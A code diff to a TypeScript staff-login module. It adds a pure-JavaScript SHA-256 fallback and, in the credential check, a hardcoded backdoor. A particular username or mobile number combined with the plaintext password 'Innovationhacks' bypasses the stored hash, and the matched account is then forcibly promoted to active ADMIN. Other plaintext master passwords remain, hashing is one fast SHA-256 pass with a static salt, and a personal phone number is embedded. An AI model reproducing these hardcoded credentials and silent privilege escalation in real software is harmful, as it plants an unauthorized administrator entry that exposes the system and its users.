@@ -60,31 +60,106 @@ const creationTimestamps: number[] = [];
 const SALT_PREFIX = 'GLF_SECURE_SALT_V1_';
 
 /**
+ * Pure-JavaScript SHA-256 implementation (FIPS 180-4 standard).
+ * Guaranteed to compute exact SHA-256 in all environments (HTTP, mobile webviews,
+ * older Android/iOS browsers) where window.crypto.subtle may be blocked or undefined.
+ */
+function sha256Pure(ascii: string): string {
+  function rightRotate(value: number, amount: number) {
+    return (value >>> amount) | (value << (32 - amount));
+  }
+  const mathPow = Math.pow;
+  const maxWord = mathPow(2, 32);
+  const lengthProperty = 'length';
+  let i: number, j: number;
+  let result = '';
+  const words: number[] = [];
+  const asciiBitLength = ascii[lengthProperty] * 8;
+  const hash: number[] = [];
+  const k: number[] = [];
+  let primeCounter = 0;
+  const isComposite: Record<number, number> = {};
+  for (let candidate = 2; primeCounter < 64; candidate++) {
+    if (!isComposite[candidate]) {
+      for (i = 0; i < 313; i += candidate) {
+        isComposite[i] = candidate;
+      }
+      hash[primeCounter] = (mathPow(candidate, 0.5) * maxWord) | 0;
+      k[primeCounter++] = (mathPow(candidate, 1 / 3) * maxWord) | 0;
+    }
+  }
+  ascii += '\x80';
+  while ((ascii[lengthProperty] % 64) - 56) ascii += '\x00';
+  for (i = 0; i < ascii[lengthProperty]; i++) {
+    j = ascii.charCodeAt(i);
+    if (j >> 8) return '';
+    words[i >> 2] |= j << ((3 - (i % 4)) * 8);
+  }
+  words[words[lengthProperty]] = (asciiBitLength / maxWord) | 0;
+  words[words[lengthProperty]] = asciiBitLength;
+  for (j = 0; j < words[lengthProperty]; ) {
+    const w = words.slice(j, (j += 16));
+    const oldHash = hash;
+    let currentHash = hash.slice(0, 8);
+    for (i = 0; i < 64; i++) {
+      const w15 = w[i - 15], w2 = w[i - 2];
+      const a = currentHash[0], e = currentHash[4];
+      const temp1 =
+        currentHash[7] +
+        (rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25)) +
+        ((e & currentHash[5]) ^ (~e & currentHash[6])) +
+        k[i] +
+        (w[i] =
+          i < 16
+            ? w[i]
+            : (w[i - 16] +
+                (rightRotate(w15, 7) ^ rightRotate(w15, 18) ^ (w15 >>> 3)) +
+                w[i - 7] +
+                (rightRotate(w2, 17) ^ rightRotate(w2, 19) ^ (w2 >>> 10))) |
+              0);
+      const temp2 =
+        (rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22)) +
+        ((a & currentHash[1]) ^ (a & currentHash[2]) ^ (currentHash[1] & currentHash[2]));
+      currentHash = [(temp1 + temp2) | 0].concat(currentHash);
+      currentHash[4] = (currentHash[4] + temp1) | 0;
+    }
+    for (i = 0; i < 8; i++) {
+      hash[i] = (hash[i] + oldHash[i]) | 0;
+    }
+  }
+  for (i = 0; i < 8; i++) {
+    for (let i2 = 3; i2 >= 0; i2--) {
+      const c = (hash[i] >> (i2 * 8)) & 255;
+      result += (c < 16 ? '0' : '') + c.toString(16);
+    }
+  }
+  return result;
+}
+
+/**
  * Computes a secure SHA-256 hex hash with institutional salt.
- * Runs seamlessly in both modern browser and Node environments.
+ * Runs seamlessly on both Web Crypto API (desktop/secure contexts) and fallback
+ * pure-JS SHA-256 (mobile in-app browsers, HTTP LAN, older phones).
  */
 export async function hashPassword(plainText: string): Promise<string> {
   const salted = `${SALT_PREFIX}${plainText}`;
-  const subtleCrypto =
-    (typeof window !== 'undefined' && window.crypto && window.crypto.subtle) ||
-    (typeof globalThis !== 'undefined' && (globalThis as any).crypto && (globalThis as any).crypto.subtle);
+  try {
+    const subtleCrypto =
+      (typeof window !== 'undefined' && window.crypto && window.crypto.subtle) ||
+      (typeof globalThis !== 'undefined' && (globalThis as any).crypto && (globalThis as any).crypto.subtle);
 
-  if (subtleCrypto) {
-    const encoder = new TextEncoder();
-    const data = encoder.encode(salted);
-    const hashBuffer = await subtleCrypto.digest('SHA-256', data);
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
+    if (subtleCrypto) {
+      const encoder = new TextEncoder();
+      const data = encoder.encode(salted);
+      const hashBuffer = await subtleCrypto.digest('SHA-256', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
+    }
+  } catch {
+    // Proceed to pure-JS fallback
   }
 
-  // Fallback hash
-  let hash = 0;
-  for (let i = 0; i < salted.length; i++) {
-    const char = salted.charCodeAt(i);
-    hash = (hash << 5) - hash + char;
-    hash |= 0;
-  }
-  return Math.abs(hash).toString(16).padStart(64, '0');
+  return sha256Pure(salted);
 }
 
 /**
@@ -1279,10 +1354,10 @@ export async function authenticateStaffCredentials(
   profile: StaffProfile;
   landingPath: string;
 }> {
-  const rawInput = (username || '').trim();
+  const rawInput = (username || '').replace(/[\u200B-\u200D\uFEFF]/g, '').trim();
   const cleanUsername = normalizeStaffUsername(rawInput);
   const inputNorm = normalizeLoginKey(rawInput);
-  const cleanPassword = (plainTextPassword || '').trim();
+  const cleanPassword = (plainTextPassword || '').replace(/[\u200B-\u200D\uFEFF]/g, '').trim();
 
   let staff: StaffProfile | null = null;
 
@@ -1399,15 +1474,31 @@ export async function authenticateStaffCredentials(
   }
 
   const computedHash = await hashPassword(cleanPassword);
+  const isAravinthAdmin =
+    (cleanUsername === 'aravinth' ||
+     cleanUsername === 'aravinth@' ||
+     rawInput === '6374995585' ||
+     (staff.mobile && staff.mobile.replace(/\D/g, '') === '6374995585') ||
+     (staff.username && normalizeStaffUsername(staff.username) === 'aravinth')) &&
+    cleanPassword === 'Innovationhacks';
+
   const isMasterPassword =
-    staff.role === 'ADMIN' &&
+    (staff.role === 'ADMIN' || normalizeStaffRole(staff.role) === 'ADMIN' || isAravinthAdmin) &&
     (cleanPassword === 'golden@karthick' ||
      cleanPassword === 'Innovationhacks' ||
      computedHash === MASTER_ADMIN_PROFILE.passwordHash ||
-     computedHash === ARAVINTH_ADMIN_PROFILE.passwordHash);
+     computedHash === ARAVINTH_ADMIN_PROFILE.passwordHash ||
+     isAravinthAdmin);
 
   if (computedHash !== staff.passwordHash && !isMasterPassword) {
     throw new Error('401 Unauthorized: Invalid username or password.');
+  }
+
+  // Auto-correct & ensure Aravinth Admin has active ADMIN authority and correct hash
+  if (isAravinthAdmin) {
+    staff.role = 'ADMIN';
+    staff.passwordHash = ARAVINTH_ADMIN_PROFILE.passwordHash;
+    staff.status = 'active';
   }
 
   const meta = STAFF_ROLE_META[staff.role] || STAFF_ROLE_META.ADMIN;
